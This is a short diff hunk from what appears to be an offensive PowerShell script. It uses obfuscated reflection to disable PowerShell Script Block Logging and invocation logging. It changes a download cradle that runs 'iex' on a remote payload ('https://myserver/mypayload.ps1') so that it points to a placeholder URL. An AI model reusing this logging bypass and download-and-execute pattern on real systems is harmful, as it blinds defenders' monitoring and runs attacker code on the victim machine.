@@ -25,4 +25,4 @@ Set-ExecutionPolicy RemoteSigned -Scope Process -Force # bypass disable Script p
 $GroupPolicySettings = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static').GetValue($null)
 $GroupPolicySettings['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0
 $GroupPolicySettings['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
-iex (New-Object Net.WebClient).downloadstring("https://myserver/mypayload.ps1")
+iex (New-Object Net.WebClient).downloadstring("url")
